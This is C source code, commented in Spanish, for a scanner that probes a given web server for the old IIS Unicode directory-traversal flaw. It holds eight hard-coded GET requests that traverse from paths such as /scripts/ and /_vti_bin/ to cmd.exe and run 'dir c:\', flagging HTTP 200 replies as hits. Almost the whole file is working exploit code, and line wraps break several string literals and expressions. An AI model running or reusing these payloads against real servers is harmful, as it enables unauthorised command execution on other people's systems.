/*

                                        Unicode scanner
                                        Escrito Por QQmelo
                                        Buenos Aires   Argentina
                                        
*/ 
                                        

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <unistd.h>



struct hostent *he;
int bucle;
char *buff[200];
char encontrado[]="200";
char *resultado;
int sock;
struct sockaddr_in target;
char lista[20];
int contador;

int main (int argc, char *argv[]) {


if (argc < 2 )

        {
                printf("Error, Uso %s <HOST> \n",argv[0]);
                exit(0);


        }
        
/*       Las siguientes son las entradas que pueden ser usadas para el 
bug del unicode !!! 

*/      


        buff[0]="GET /scripts/..%c0%
af../winnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\n\n";
        buff[1]="GET /scripts/..%c0%
af../winnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\n\n";
        buff[2]="GET /iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%
af../winnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\n\n";
        buff[3]="GET /cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%
af../winnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\n\n";
        buff[4]="GET /samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%
af../winnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\n\n";
        buff[5]="GET /_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%
af../winnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\n\n";
        buff[6]="GET /_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%
af../winnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\n\n";
        buff[7]="GET /adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%
af../winnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\n\n";




        if ((he=gethostbyname(argv[1])) == NULL)


{

                printf(" Host erroneo \n");
                exit(0);

};



                bcopy(he->h_addr, (char *)&target.sin_addr, he-
>h_length);

        target.sin_port=htons(80);

        target.sin_family=AF_INET;


        
        for(bucle=0;bucle < 8 ; bucle++)

        {
                        
                sock=socket(AF_INET,SOCK_STREAM,0);             
                if(connect(sock,(struct sockaddr *)&target,sizeof
(target)) < 0)

                        
                        {

                                printf("No se ha podido abrir el puerto 
\n");
                                close(sock);
                                exit(0);        
                
                        }


for (contador=0;contador<20;contador++)

                {

                                lista[contador] = '\0'; 

                }
        
        send(sock, buff[bucle],strlen(buff[bucle]),0);
         recv(sock, lista, sizeof(lista),0);


        resultado = strstr(lista,encontrado);
        if( resultado != NULL)

                {

                        printf("Unicode encontrado %d  \n",bucle);
                        close(sock);

                }
                        else

                {

                        printf(" no esta %d\n",bucle);
                        close(sock);
                }

}
printf ("\n Scan Terminado \n\n");

}